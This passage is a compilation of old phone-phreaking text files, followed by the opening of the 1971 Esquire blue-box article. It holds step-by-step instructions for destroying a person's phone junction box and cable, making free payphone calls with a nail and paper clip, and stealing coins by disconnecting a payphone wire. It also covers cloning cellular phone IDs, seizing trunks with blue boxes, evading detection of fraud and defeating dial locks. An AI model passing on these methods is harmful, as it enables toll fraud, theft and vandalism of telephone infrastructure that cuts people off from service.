certainly won't get the local policeman to hold your flashlight for
you.

               Dealing with the Rate & Route Operator         


        It seems that fewer and fewer people have blue boxes
these days, and that is really too bad.  Blue boxes, while not
all that great for making free calls (since the TPC can tell when
the call was made, as well as where it was too and from), are
really a lot of fun to play with.  Short of becoming a real live
TSPS operator, they are about the only way you can really play
with the network.

        For the few of you with blue boxes, here are some phrases
which may make life easier when dealing with the rate & route
(R&R) operators.  To get the R&R op, you send a KP + 141 + ST.
In some areas you may need to put another NPA before the 141
(i.e., KP + 213 + 141 + ST), if you have no local R&R ops.

        The R&R operator has a myriad of information, and all it
takes to get this data is mumbling cryptic phrases.  There are
basically four special phrases to give the R&R ops.  They are
NUMBERS route, DIRECTORY route, OPERATOR route, and PLACE NAME.

        To get an R&R an area code for a city, one can call the
R&R operator and ask for the numbers route.  For example, to find
the area code for Carson City, Nevada, we'd ask the R&R op for
"Carson City, Nevada, numbers route, please." and get the answer,
"Right... 702 plus." meaning that 702 plus 7 digits gets us
there.
        Sometimes directory assistance isn't just NPA + 131. The
way to get these routings is to call R&R and ask for "Anaheim,
California, directory route, please." Of course, she'd tell us it
was 714 plus, which means 714 + 131 gets us the D.A. op there.
This is sort of pointless example, but I couldn't come up with a
better one on short notice.

        Let's say you wanted to find out how to get to the inward
operator for Sacremento, California.  The first six digits of a
number in that city will be required (the NPA and an NXX).  For
example, let us use 916 756. We would call R&R, and when the
operator answered, say, "916 756, operator route, please." The
operator would say, "916 plus 001 plus."  This means that 916
+ 001 + 121 will get you the inward operator for Sacramento. Do
you know the city which corresponds to 503 640?  The R&R operator
does, and will tell you that it is Hillsboro, Oregon, if you
sweetly ask for "Place name, 503 640, please."

        For example, let's say you need the directory route for
Sveg, Sweden. Simply call R&R, and ask for, "International,
Baden, Switzerland. TSPS directory route, please."  In response
to this, you'd get, "Right... Directory to Sveg, Sweden.  Country
code 46 plus 1170."  So you'd route yourself to an
international sender, and send 46 + 1170 to get the D.A. operator
in Sweden.

        Inward operator routings to various countries are
obtained the same way "International, London, England, TSPS
inward route, please." and get "Country code 44 plus 121."
Therefore, 44 plus 121 gets you inward for London.
        Inwards can get you language assitance if you don't speak
the language. Tell the foreign inward, "United Staes calling.
Language assitance in completing a call to (called party) at
(called number)."
        R&R operators are people are people too, y'know.  So
always be polite, make sure use of 'em, and dial with care.


-----------RFLAGGPhone related vandalism                     by the Jolly Roger

If you live where there are underground lines then you will be 
able to ruin someone's phone life very easily. All you must do is 
go to their house and find the green junction box that interfaces 
their line (and possibly some others in the neighborhood) with the 
major lines. These can be found just about anywhere but they are 
usually underneath the nearest phone pole. Take a socket wrench 
and loosen the nut on the right. Then just take clippers or a 
sledge hammer or a bomb and destroy the insides and pull up their 
phone cable. Now cut it into segments so it can't be fixed but 
must be replaced (There is a week's worth of work for 'em!!)
Another place to phuck with lines is in new developments.  When 
houses/apartments/condos are still in the plywood and dirt stage, 
the lines are run into junxion boxes.  When the crew goes home for 
the day, plan your attack.  Just destroy the shit out of the box, 
then replace the cover.  Watch em' go nuts as they try to figure
out where the line broke in the walls <DUH!> !

                           by the Jolly Roger

Now to make free local calls, you need a finishing nail.  I highly
recommend "6D E.G. FINISH C/H, 2 INCH" nails.  These are about 3/32 of
an inch in diameter and 2 inches long (of course).  You also need a large
size paper clip. By large  I  mean they  are  about  2  inches  long
(FOLDED). Then  you  unfold the paper clip.  Unfold it by taking each piece
and moving it out 90 degrees.  When it is done it should look somewhat
like this: 

                               /----------\
                               :          :
                               :          :
                               :          :
                               :          :
                                          \-----     

Now,  on to the neat stuff.  What you do,  instead of unscrewing the 
glued-on  mouthpiece,  is  insert the nail into the center  hole  of
the mouthpiece  (where you talk) and push it in with
pressure or just hammer it in by hitting the nail on something. 
Just DON'T KILL THE  MOUTHPIECE! You  could  damage  it
if you insert the nail too far or  at  some  weird angle.  If  this
happens then the other party won't be able to hear  what you say.
You now have a hole in the mouthpiece in which you can easily insert the 
paper clip. So, take out the nail and put in the paper  clip.
Then take the other end of the paper clip and shove it under the rubber
cord protector at the bottom of the handset (you know, the blue guy...).
This should end up looking remotely like...like this:
                            /----------\      Mouthpiece
                            :          :

                                   :  To earpiece ->
                                   ^              ^
                                   \-------------------->
                                   :              :
                                   :              :         
                                 Cord          Blue guy
(The  paper clip is shoved under the blue guy to make a  good  connection
between the inside of the mouthpiece and the metal cord.)
Now,  dial  the number of a local number you wish to  call,  sayyyy, 
MCI.  If  everything  goes okay, it should ring and not answer with the 
"The Call You Have Made Requires a 20 Cent Deposit" recording.  After the 
other  end  answers  the phone, remove the  paper  clip.  It's  all  that 
simple, see?
There  are  a couple problems,  however.  One  is,  as  I mentioned 
earlier, the mouthpiece not working after you punch it.  If this  
happens to you,  simply move on to the next payphone.  The one you are
now on  is lost.  Another problem is that the touch tones won't work
when the paper clip is in the mouthpiece. There are two ways around this..
A> Dial the first 6 numbers.  This should be done without the  paper 
clip making the connection, i.e., one side should not be connected.
Then connect  the paper clip,  hold down the last digit,  and slowly
pull  the paper clip out at the mouthpiece's end.
B> Don't  use  the paper clip at all.  Keep the nail  in  after  you punch
it.  Dial the first 6 digits.  Before dialing the last digit, touch
the nail head to the plate on the main body of the phone,  the money
safe thingy..then press the last number. The  reason  that this method
is sometimes called  clear  boxing  is because  there is
another type of phone which lets you actually make  the call  and  listen
to  them say "Hello,  hello?"  but  it  cuts  off  the mouthpiece  so they
can't hear you.  The Clear Box is used  on  that  to amplify your voice
signals and send it through the earpiece. If you  see how  this  is
even slightly similar to the method I have just described up there,
kindly explain it to ME!! Cause I don't GET IT!  Anyways,  this DOES
work on almost all single slot,  Dial Tone First payphones (Pacific Bell
for sure).  I do it all the time.  This  is  the least,  I STRESS
*LEAST*, risky form of Phreaking.

I was unable to update this one.  From what I recall, it stil worked.  
Look for payfones w/o the little volume button in the upper left of the
casing.  They should be old enough to use..        -RFLAGG-


Getting Money out of Pay Phones                by the Jolly Roger

I will now share with you my experiences with pay telephones.  You will discover
that it is possible to get money from a pay phone with a minimum of effort.
Theory: Most pay phones use four wires for the transmission of data and 
codes to the central office.  Two of them are used for voice (usually red and
green), one is a ground, and the last is used with the others for the
transmission of codes.
It is with this last wire that you will be working with.  On the pay phone that
I usually did this to, it was colored purple, but most likely will be another
color.
What you will do is simply find a pay phone which has exposed wires, such that
one of them can be disconnected and connected at ease without
fear of discovery. You will discover that it is usually a good idea to
have some electrical tape along with you and some tool for cutting this
tape. 
Through trial and error, you will disconnect one wire at a time starting with
the wires different than green and red.  You do want a dial tone during
this operation.
What you want to disconnect is the wire supplying the codes to the telephone
company so that the pay phone will not get the 'busy' or 'hang-up' command.
Leave this wire disconnected when you discover it.
What will happen:  Anytime that someone puts any amount of money into the pay
phone, the deposit will not register with the phone company and it
will be held in the 'temporary' chamber of the pay phone.
Then, (a day later or so) you just code back to the phone, reconnect the wire,
and click the hook a few times and the phone will dump it all out the shute.
(What is happening is that the 'hangup' code that the phone was not
receiving due to the wire being disconnected suddenly gets the code and
dumps its' 'temporary' storage spot.)
You can make a nice amount of money this way, but remember
that a repairman will stop by every few times it is reported broken and
repair it, so check it at least once a day.
Enjoy and have fun.. Many phones I have done this to, and it works
well with each..

Cellular Phreaking                         courtesy of The  Jolly Roger

     The cellular/mobile phone system is one that is perfectly set up to be
exploited by phreaks with the proper knowledge and equipment.  Thanks to
deregulation, the regional BOC's (Bell Operating Companies) are scattered
and do not communicate much with each other.  Phreaks can take advantage of
this by pretending to be mobile phone customers whose "home base" is a city
served by a different BOC, known as a "roamer".  Since it is impractical
for each BOC to keep track of the customers of all the other BOC's, they
will usually allow the customer to make the calls he wishes, often with a
surcharge of some sort.

The bill is then forwarded to the roamer's home BOC for collection.
However, it is fairly simple (with the correct tools) to create a bogus ID
number for your mobile phone, and pretend to be a roamer from some other
city and state, that's "just visiting".  When your BOC tries to collect for
the calls from your alleged "home BOC", they will discover you are not a
real customer; but by then, you can create an entirely new electronic
identity, and use that instead. 
    How does the cellular system know who is calling, and where they are?
When a mobile phone enters a cell's area of transmission, it transmits its
phone number and its 8 digit ID number to that cell, who will keep track of
it until it gets far enough away that the sound quality is sufficiently
diminished, and then the phone is "handed off" to the cell that the customer
has walked or driven into.  This process continues as long as the phone has
power and is turned on.  If the phone is turned off (or the car is), someone
attempting to call the mobile phone will receive a recording along the
lines of "The mobile phone customer you have dialed has left the vehicle
or driven out of the service area."   When a call is made to a mobile phone,
the switching equipment will check to see if the mobile phone being called is
"logged in", so to speak, or present in one of the cells.  If it is, the
call will then act (to the speaking parties) just like a normal call - the
caller may hear a busy tone, the phone may just ring, or the call may be
answered. 
    How does the switching equipment know whether or not a particular
phone is authorized to use the network?  Many times, it doesn't.  When a
dealer installs a mobile phone, he gives the phone's ID number (an 8 digit
hexadecimal number) to the local BOC, as well as the phone number the BOC
assigned to the customer.  Thereafter, whenever a phone is present in one
of the cells, the two numbers are checked - they should be registered to
the same person.  If they don't match, the telco knows that an attempted
fraud is taking place (or at best, some transmission error) and will not
allow calls to be placed or received at that phone.  However, it is
impractical (especially given the present state of deregulation) for the
telco to have records of every cellular customer of every BOC.  Therefore,
if you're going to create a fake ID/phone number combination, it will need
to be "based" in an area that has a cellular system (obviously), has a
different BOC than your local area does, and has some sort of a "roamer"
agreement with your local BOC.

   How can one "phreak" a cellular phone?  There are three general areas
when phreaking cellular phones; using one you found in an unlocked car
(or an unattended walk-about model), modifying your own chip set to look
like a different phone, or recording the phone number/ID number combinations
sent by other local cellular phones, and using those as your own.  Most
cellular phones include a crude "password" system to keep unauthorized
users from using the phone - however, dealers often set the password 
(usually a 3 to 5 digit code) to the last four digits of the customer's
mobile phone number.  If you can find that somewhere on the phone, you're
in luck.  If not, it shouldn't be TOO hard to hack, since most people
aren't smart enough to use something besides "1111", "1234", or whatever.
If you want to modify the chip set in a cellular phone you bought
(or stole), there are two chips (of course, this depends on the model and
manufacturer, yours may be different) that will need to be changed - one
installed at the manufacturer (often epoxied in) with the phone's ID
number, and one installed by the dealer with the phone number, and possible
the security code.  To do this, you'll obviously need an EPROM burner
as well as the same sort of chips used in the phone (or a friendly and
unscrupulous dealer!).  As to recording the numbers of other mobile phone
customers and using them; as far as I know, this is just theory... but it
seems quite possible, if you've got the equipment to record and decode it.
The cellular system would probably freak out if two phones (with valid
ID/phone number combinations) were both present in the network at once,
but it remains to be seen what will happen.

Here are a few tips on how not to get caught when using MCI or other
such services:
   1- Try not to use them for voice to voice personal calls. Try to use
      them for computer calls only. Here is why:
      MCI and those other services can't really trace the calls that
      come through the lines,they can just monitor them. They can 
      listen in on your calls and from that,they can get your name and
      other information from the conversation. They can also call
      the number you called and ask your friend some questions. If
      you call terminals and BBS'S then it is much harder to get
      information. For one thing,most sysops won't give these dudes
      that call any info at all or they will act dumb because they
      PHREAK themselves!
   2- Beware when using colored boxes! They are easy to find!!!!!
   3- Try to find a sine-wave number. Then use an MCI or other service
      to call it. You will hear a tone that goes higher and lower. If
      the tone just stops,then that code is being monitored and you
      should beware when using it.
----------------------------------------
     If you do get caught,then if you think you can,try to weasel out of it.
    I have heard many stories about people that have pleaded with the MCI
 guys and have been let off. You will get a call from a guy that has been
 monitoring you. Act nice. Act like you know it is now wrong to do this
 kind of thing.....just sound like you are sorry for what you did. (If you
 get a call,you probably will be a little sorry!)
 Otherwise,it is very dangerous!!!!!!! (Very with a capital V!)

The Myth of the 2600hz Detector        courtesy of the Jolly Roger
    (Imported from the Apple ][ so forgive the upper case!!)

JUST ABOUT EVERYONE I TALK TO THESE DAYS ABOUT ESS SEEMS TO BE SCARED
WITLESS ABOUT THE 2600HZ DETECTOR. I DON'T KNOW WHO THOUGHT THIS ONE UP,
BUT IT SIMPLY DOES NOT EXIST. SO MANY OF YOU PEOPLE WHINE ABOUT THIS SO
-CALLED PHREAK CATCHING DEVICE FOR NO REASON. 
SOMEONE WITH AT&T SAID THEY HAD IT TO CATCH PHREAKERS.  THIS WAS JUST TO
SCARE THE BLUE-BOXERS ENOUGH TO MAKE THEM QUIT BOXING FREE CALLS.
I'M NOT SAYING ESS IS WITHOUT ITS HANG-UPS, EITHER. ONE THING THAT ESS CAN
DETECT READILY IS THE KICK-BACK THAT THE TRUNK CIRCUITRY SENDS BACK TO THE
ESS MACHINE WHEN YOUR LITTLE 2600HZ TONE RESETS THE TOLL TRUNK. AFTER AN
ESS DETECTS A KICKBACK IT TURNS AN M-F DETECTOR ON AND RECORDES ANY M-F
TONES X-MITTED.

---------------------------------------
   DEFEATING THE KICK-BACK DETECTOR
   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

AS MENTIONED IN MY PREVIOUS NOTE, KICK-BACK DETECTION CAN BE A SERIOUS
NUISANCE TO ANYONE INTERESTED IN GAINING CONTROL OF A TRUNK LINE.
THE EASIEST WAY TO BY-PASS THIS DETECTION CIRCUITRY IS NOT REALLY
BY-PASSING IT AT ALL, IT IS JUST LETTING THE KICK-BACK GET DETECTED ON
SOME OTHER LINE. THIS OTHER LINE IS YOUR LOCAL MCI, SPRINT, OR OTHER LONG
DISTANCE CARRIER (EXCEPT AT&T).  THE ONLY CATCH IS THAT THE SERVICE 
YOU USE MUST NOT DISCONNECT THE LINE WHEN YOU HIT THE 2600HZ TONE.
THIS IS HOW YOU DO IT:  CALL UP YOUR LOCAL EXTENDER, PUT IN THE CODE,
AND DIAL A NUMBER IN THE 601 AREA CODE AND THE 644 EXCHANGE. LOTS OF OTHER
EXCHANGES WORK ACROSS THE COUNTRY, I'M SURE, BUT THIS IS THE ONLY ONE
THAT I HAVE FOUND SO FAR.  ANYWAY, WHEN IT STARTS RINGING, SIMPLY HIT
2600HZ AND YOU'LL HEAR THE KICK-BACK, (KA-CHIRP, OR WHATEVER). THEN YOU ARE
READY TO DIAL WHOEVER YOU WANT (CONFERENCES, INWARD, ROUTE AND RATE,
OVERSEAS, ETC.) FROM THE TRUNK LINE IN OPERATOR TONES! SINCE BLOWING
2600HZ DOESN'T MAKE YOU YOU A PHREAKER UNTIL THE TOLL EQUIPMENT RESETS
THE LINE, KICKBACK DETECTION IS THE METHOD AT&T CHOOSES (FOR NOW)
THIS INFORMATION COMES AS A RESULT OF MY EXPERIMENTS & EXPERIENCE AND
HAS BEEN VERIFIED BY LOCAL AT&T EMPLOYEES I HAVE AS ACQUAINTANCES.
THEY COULD ONLY SAY THAT THIS IS TRUE FOR MY AREA, BUT WERE PRETTY SURE
THAT THE SAME IDEA IS IMPLEMENTED ACROSS THE COUNTRY.

=======================================

NOW THAT YOU KNOW HOW TO ACCESS A TRUNK LINE OR AS OPERATORS SAY A LOOP, I
WILL TELL YOU THE MANY THINGS YOU CAN DO WITH IT.
HERE IS A LIST OF AT&T SERVICES ACCESSIBLE TO YOU BY USING A BLUE BOX.

A/C+101    TOLL SWITCHING
A/C+121    INWARD OPERATOR
A/C+131    INFORMATION
A/C+141    ROUTE & RATE OP.
A/C+11501  MOBILE OPERATOR
A/C+11521  MOBILE OPERATOR

STARTING CONFERANCES:---------------------

THIS IS ONE THE MOST USEFUL ATTRIBUTES OF BLUE BOXING. NOW THE CONFS.
ARE UP 24 HOURS/DAY AND 7 DAYS/WEEK AND THE BILLING LINES ARE BEING
BILLED.
SINCE I BELEIVE THE ABOVE IS TRUE (ABOUT THE BILLING LINES BEING BILLED)
I WOULD RECOMMEND THAT YOU NEVER LET YOUR # SHOW UP ON THE CONF. IF YOU
STARTED IT, PUT IT ON A LOOP AND THEN CALL THE LOOP. ENOUGH
BULLSHIT!!!!! TO START THE CONF. DIAL ONE OF THESE THREE NUMBERS IN
M-F WHILE YOU ARE ON THE TRUNK.
213+080+XXXX
XXXX=1050,3050
SPECIAL XXXX=1000,1100,1200,1500,2200,2500.
THESE #S ARE IN L.A. AND ARE THE MOST WATCHED, I DO NOT ADVISE USING THIS
NPA.
312+001+1050 OR 3050
914+042+1050 OR 1100,1200 ECT..
***************************************
UPDATE, I BELEIVE ONLY 914 WORKS AT THE MOMENT
***************************************
ONCE CONNECTED WITH ONE OF THESE YOU WILL EITHER HEAR A RE-ORDER,
BUSY, OR CHERP. WHEN YOU HEAR THE CHERP ENTER THE BILLING LINE IN M-F.
I USE THE CONF. DIAL- UP.
A BILLING LINE EXAMPLE: KP312+001+1050ST
YOU WILL THEN HEAR TWO TUTES AND A RECORDING ASKING YOU FOR THE # OF
CONFERREES INCLUDING YOURSELF.  ENTER A # BETWEEN 20 AND 30.
IF YOU EVER GET OVER 30 PEOPLE ON A CONFERANCE ALL YOU WILL HEAR IS
JUMBLED VOICES.  AFTER THE IT SAYS
"YOUR CONFERANCE SIZE IS XX" THEN HIT # SIGN.  ADD YOUR FAVORITE LOOP
ON AND HIT 6 TO TRANSFER CONTROL TO IT. AFTER IT SAYS CONTROL WILL BE
TRANSFERED HANG UP AND CALL THE OTHER SIDE OF THE LOOP,
HIT # SIGN AND FOLLOW THE INSTRUCTIONS. A BONUS FOR CONF. IS TO ADD AN
INTERNATIONAL # DIAL 1+011+CC+NUMBER PRETTY COOL EHHH.
A FEW EXTRA NOTES.
DO NOT ADD #S THAT YOU WILL WANT TO HANG UP, ADD THESE THROUGH MCI OR
SPRINT. YOU CANNOT BLOW ANYONE OFF W/2600HZ UNLESS THEY ARE IN AN
OLD X-BAR OR OLDER SYSTEM.
MANY D.A. OPERATORS WILL STAY ON AFTER YOU ABUSE THEM; YOU MAY HAVE TO
START ANOTHER OR AT LEAST DON'T SAY ANY NUMBERS.
NEVER ADD THE TONE SIDE OF A LOOP ONTO A CONF.
NEVER ADD MORE THAN ONE MCI NODE ON YOUR CONF.
ROUTE & RATE:
-------------
NOTE ROUTE & RATE AND RQS PERFORM THE SAME SERVICE.
R&R SIMPLY TELLS YOU ROUTE AND RATE INFO WHICH IS VERY VALUBLE, EX.
SUCH AS THE INWARD ROUTING FOR AN EXCHANGE IN AN AREA CODE.  
AN INWARD ROUTING WILL LET YOU CALL HER AND SHE CAN DO AN EMERGENCY
INTERUPT FOR YOU. SHE CAN TELL YOU HOW TO GET INTERNATIONAL OPERATORS,ECT.
HERE ARE THE TERMS YOU ARE REQUIRED TO USE:
INTERNATIONAL,
-OPERATOR ROUTE FOR [COUNTRY, CITY]. *GIVES YOU INWARD OP.
-DIRECTORY ROUTE FOR [COUNTRY, CITY]. *GIVES YOU DIRECTORY ASS.
-CITY ROUTE FOR [COUNTRY, CITY]. *GIVES YOU COUNTRY AND CITY CODE.
OPERATOR ROUTE FOR [A/C]+ [EXCHANGE] *GIVES YOU INWARD OP. ROUTE
EX. [A/C]+ OR [A/C]+0XX+ WHEN SHE SAYS PLUS SHE MEANS PLUS 121.
NUMBERS ROUTE FOR [STATE, CITY] *GIVES YOU A/C.
PLACE NAME [A/C]+[EXCHANGE] *GIVES YOU CITY/STATE FOR THAT A/C AND
EXCHANGE.
INTERNATIONAL CALLS:

Phone Dial Locks -- How to Beat'em      courtesy of Exodus

    Have you ever been in an office or somewhere and wanted to make a free phone
call but some asshole put a lock on the phone to prevent out-going calls? Fret
no more phellow phreake, for every system can be beaten with a little knowledge!

    There are two ways to beat this obstacle, first pick the lock, I don't have
the time to teach locksmithing so we go to the second method which takes 
advantage of telephone electronics.

    To be as simple as possibnle when you pick up the phone you complete a 
circuit known as a local loop. When you hang up you break the circuit.  When
you dial (pulse) it also breaks the circuit but not long enough to hang up! So 
you can "Push-dial."  To do this you >>> RAPIDLY <<< depress the switchhook.
For example, to dial an operator (and then give her the number you want to call)
>>> RAPIDLY <<< & >>> EVENLY <<< depress the switchhook 10 times.  To dial
634-1268, depress 6 X'S pause, then 3 X'S, pause, then 4X'S, etc.  It takes a
little practice but you'll get the hang of it.  Try  practicing with your own #
so you'll get a busy tone when right.  It'll also work on touch-tone(tm) since
a DTMF line will also accept pulse.  Also, never depress the switchhook for
more than a second or it'll hang up!

    Finally, remember that you have just as much right to that phone as the
asshole who put the lock on it!

Exchange Scanning                       courtesy of Exodus


    Almost every exchange in the bell system has test #'s and other "goodies"
such as loops with dial-ups. These "goodies" are usually found betweed 9900 
and 9999 in your local exchange.  If you have the time and initiative, scan 
your exchange and you may become lucky!

Here are some findings in the 914-268 exchange:


9900 - ANI 
9901 - ANI 
9927 - OSC. TONE (POSSIBLE TONE SIDE OF A LOOP)
9936 - VOICE # TO THE TELCO CENTRAL OFFICE
9937 - VOICE # TO THE TELCO CENTRAL OFFICE
9941 - COMPUTER (DIGITAL VOICE TRANSMISSION?)
9960 - OSC. TONE (TONE SIDE LOOP) MAY ALSO BE A COMPUTER IN SOME EXCHANGES
9961 - NO RESPONSE (OTHER END OF LOOP?)
9962 - NO RESPONSE (OTHER END OF LOOP?)
9963 - NO RESPONSE (OTHER END OF LOOP?)
9966 - COMPUTER (SEE 9941)
9968 - TONE THAT DISAPPEARS--RESPONDS TO CERTAIN TOUCH-TONE KEYS

    Most of the numbers between 9900 & 9999 will ring or go to a "what #,
please?" operator.

A Short History of Phreaking             courtesy of Exodus

   Well now we know a little vocabulary, and now its into history, Phreak
history.  Back at MIT in 1964 arrived a student by the name of Stewart Nelson,
who was extremely interested in the telephone.  Before entering MIT, he had
built autodialers, cheese boxes, and many more gadgets.  But when he came to
MIT he became even more interested in "fone-hacking" as they called it.  After
a little while he naturally started using the PDP-1, the schools computer at
that time, and from there he decided that it would be interesting to see
whether the computer could generate the frequencies required for blue boxing.
The hackers at MIT were not interested in ripping off Ma Bell, but just
exploring the telephone network.  Stew (as he was called) wrote a program to
generate all the tones and set off into the vast network.
   Now there were more people phreaking than the ones at MIT.  Most people have
heard of Captain Crunch (No not the cereal), he also discovered how to take
rides through the fone system, with the aid of a small whistle found in a
cereal box (can we guess which one?).  By blowing this whistle, he generated
the magical 2600hz and into the mouthpiece it sailed, giving him complete
control over the system.  I have heard rumors that at one time he made about
1/4 of the calls coming out of San Francisco.  He got famous fast.  He made the
cover of people magazine and was interviewed several times (as you'll soon
see).  Well he finally got caught after a long adventurous career.  After he
was caught he was put in jail and was beaten up quite badly because he would
not teach other inmates how to box calls.  After getting out, he joined Apple
computer and is still out there somewhere.
   Then there was Joe the Whistler, blind form the day he was born.  He could
whistle a perfect 2600hz tone.  It was rumored phreaks used to call him to tune
their boxes.
   Well that was up to about 1970, then from 1970 to 1979, phreaking was mainly
done by college students, businessmen and anyone who knew enough about
electronics and the fone company to make a 555 Ic to generate those magic
tones.  Businessmen and a few college students mainly just blue box to get free
calls.  The others were still there, exploring 800#'s and the new ESS systems.
ESS posed a big problem for phreaks then and even a bigger one now.  ESS was
not widespread, but where it was, blue boxing was next to impossible except for
the most experienced phreak.  Today ESS is installed in almost all major cities
and blue boxing is getting harder and harder.
   1978 marked a change in phreaking, the Apple ][, now a computer that was
affordable, could be programmed, and could save all that precious work on a
cassette.  Then just a short while later came the Apple Cat modem.  With this
modem, generating all blue box tones was easy as writing a program to count
form one to ten (a little exaggerated).  Pretty soon programs that could
imitate an operator just as good as the real thing were hitting the community,
TSPS and Cat's Meow, are the standard now and are the best.
   1982-1986: LD services were starting to appear in mass numbers.  People now
had programs to hack LD services, telephone exchanges, and even passwords.  By
now many phreaks were getting extremely good and BBS's started to spring up
everywhere, each having many documentations on phreaking for the novice.  Then
it happened, the movie War Games was released and mass numbers of sixth grade
to all ages flocked to see it.  The problem wasn't that the movie was bad, it
was that now EVERYONE wanted to be a hacker/phreak.  Novices came out in such
mass numbers, that bulletin boards started to be busy 24 hours a day.  To this
day, they still have not recovered.  Other problems started to occur, novices
guessed easy passwords on large government computers and started to play
around...  Well it wasn't long before they were caught, I think that many
people remember the 414-hackers.  They were so stupid as to say "yes" when the
computer asked them whether they'd like to play games.  Well at least it takes
the heat off the real phreaks/hacker/krackers.

-A story so incredible it may even make you feel sorry for the phone company-

Printed in the October 1971 issue of Esquire Magazine.  If you happen to be in
a library and come across a collection of Esquire magazines, the October 1971
issue is the first issue printed in the smaller format.  The story begins on
page 116 with a picture of a blue box.
                                      --One Farad Cap, Atlantic Anarchist Guild


The Blue Box Is Introduced: Its Qualities Are Remarked

I am in the expensively furnished living room of Al Gilbertson (His real name
has been changed.), the creator of the "blue box." Gilbertson is holding one of
his shiny black-and-silver "blue boxes" comfortably in the palm of his hand,
pointing out the thirteen little red push buttons sticking up from the console.
He is dancing his fingers over the buttons, tapping out discordant beeping
electronic jingles.  He is trying to explain to me how his little blue box does
nothing less than place the entire telephone system of the world, satellites,
cables and all, at the service of the blue-box operator, free of charge.

"That's what it does.  Essentially it gives you the power of a super operator.
You seize a tandem with this top button," he presses the top button with his
index finger and the blue box emits a high-pitched cheep, "and like that" --
cheep goes the blue box again -- "you control the phone company's long-distance
switching systems from your cute little Princes phone or any old pay phone.
And you've got anonymity.  An operator has to operate from a definite location:
the phone company knows where she is and what she's doing.  But with your
beeper box, once you hop onto a trunk, say from a Holiday Inn 800 (toll-free)
number, they don't know where you are, or where you're coming from, they don't
know how you slipped into their lines and popped up in that 800 number.  They
don't even know anything illegal is going on.  And you can obscure your origins
through as many levels as you like.  You can call next door by way of White
Plains, then over to Liverpool by cable, and then back here by satellite.  You
can call yourself from one pay phone all the way around the world to a pay
phone next to you.  And you get your dime back too."

"And they can't trace the calls?  They can't charge you?"
"Not if you do it the right way.  But you'll find that the free-call thing
isn't really as exciting at first as the feeling of power you get from having
one of these babies in your hand.  I've watched people when they first get hold
of one of these things and start using it, and discover they can make
connections, set up crisscross and zigzag switching patterns back and forth
across the world.  They hardly talk to the people they finally reach.  They say
hello and start thinking of what kind of call to make next.  They go a little
crazy."  He looks down at the neat little package in his palm.  His fingers are
still dancing, tapping out beeper patterns.

"I think it's something to do with how small my models are.  There are lots of
blue boxes around, but mine are the smallest and most sophisticated
electronically.  I wish I could show you the prototype we made for our big
syndicate order."

He sighs.  "We had this order for a thousand beeper boxes from a syndicate
front man in Las Vegas.  They use them to place bets coast to coast, keep lines
open for hours, all of which can get expensive if you have to pay.  The deal
was a thousand blue boxes for $300 apiece. Before then we retailed them for
$1500 apiece, but $300,000 in one lump was hard to turn down.  We had a
manufacturing deal worked out in the Philippines.  Everything ready to go.
Anyway, the model I had ready for limited mass production was small enough to
fit inside a flip-top Marlboro box.  It had flush touch panels for a keyboard,
rather than these unsightly buttons, sticking out.  Looked just like a tiny
portable radio.  In fact, I had designed it with a tiny transistor receiver to
get one AM channel, so in case the law became suspicious the owner could switch
on the radio part, start snapping his fingers, and no one could tell anything
illegal was going on. I thought of everything for this model -- I had it lined
with a band of thermite which could be ignited by radio signal from a tiny
button transmitter on your belt, so it could be burned to ashes instantly in
case of a bust.  It was beautiful.  A beautiful little machine.  You should
have seen the faces on these syndicate guys when they came back after trying it
out.  They'd hold it in their palm like they never wanted to let it go, and
they'd say, 'I can't believe it.  I can't believe it.'  You probably won't
believe it until you try it."

The Blue Box Is Tested: Certain Connections Are Made

About eleven o'clock two nights later Fraser Lucey has a blue box in the palm
of his left hand and a phone in the palm of his right.  He is standing inside a
phone booth next to an isolated shut-down motel off Highway 1.  I am standing
outside the phone booth.

Fraser likes to show off his blue box for people.  Until a few weeks ago when
Pacific Telephone made a few arrests in his city, Fraser Lucey liked to bring
his blue box (This particular blue box, like most blue boxes, is not blue.
Blue boxes have come to be called "blue boxes" either because 1) The first blue
box ever confiscated by phone-company security men happened to be blue, or 2)
To distinguish them from "black boxes."  Black boxes are devices, usually a
resistor in series, which, when attached to home phones, allow all incoming
calls to be made without charge to one's caller.) to parties.  It never failed:
a few cheeps from his device and Fraser became the center of attention at the
very hippest of gatherings, playing phone tricks and doing request numbers for
hours.  He began to take orders for his manufacturer in Mexico.  He became a
dealer.

Fraser is cautious now about where he shows off his blue box.  But he never
gets tired of playing with it.  "It's like the first time every time," he tells
me.

Fraser puts a dime in the slot.  He listens for a tone and holds the receiver
up to my ear.  I hear the tone. Fraser begins describing, with a certain
practiced air, what he does while he does it. "I'm dialing an 800 number now.
Any 800 number will do.  It's toll free. Tonight I think I'll use the ----- (he
names a well-know rent-a-car company) 800 number.  Listen, It's ringing.  Here,
you hear it?  Now watch."  He places the blue box over the mouthpiece of the
phone so that the one silver and twelve black push buttons are facing up toward
me.  He presses the silver button -- the one at the top -- and I hear that
high-pitched beep. "That's 2600 cycles per second to be exact," says Lucey.
"Now, quick. listen."  He shoves the earpiece at me.  The ringing has vanished.
The line gives a slight hiccough, there is a sharp buzz, and then nothing but
soft white noise.

"We're home free now," Lucey tells me, taking back the phone and applying the
blue box to its mouthpiece once again.  "We're up on a tandem, into a
long-lines trunk.  Once you're up on a tandem, you can send yourself anywhere
you want to go."  He decides to check out London first.  He chooses a certain
pay phone located in Waterloo Station.  This particular pay phone is popular
with the phone-phreaks network because there are usually people walking by at
all hours who will pick it up and talk for a while.

He presses the lower left-hand corner button which is marked "KP" on the face
of the box. "That's Key Pulse.  It tells the tandem we're ready to give it
instructions.  First I'll punch out KP 182 START, which will slide us into the
overseas sender in White Plains."  I hear a neat clunk-cheep.  "I think we'll
head over to England by satellite. Cable is actually faster and the connection
is somewhat better, but I like going by satellite.  So I just punch out KP Zero
44.  The Zero is supposed to guarantee a satellite connection and 44 is the
country code for England.  Okay... we're there.  In Liverpool actually.  Now
all I have to do is punch out the London area code which is 1, and dial up the
pay phone.  Here, listen, I've got a ring now."

I hear the soft quick purr-purr of a London ring.  Then someone picks up the
phone.

"Hello," says the London voice.

"Hello.  Who's this?" Fraser asks.

"Hello.  There's actually nobody here.  I just picked this up while I was
passing by.  This is a public phone.  There's no one here to answer actually."

"Hello.  Don't hang up.  I'm calling from the United States."

"Oh.  What is the purpose of the call?  This is a public phone you know."

"Oh.  You know.  To check out, uh, to find out what's going on in London.  How
is it there?"

"Its five o'clock in the morning.  It's raining now."

"Oh.  Who are you?"

The London passerby turns out to be an R.A.F. enlistee on his way back to the
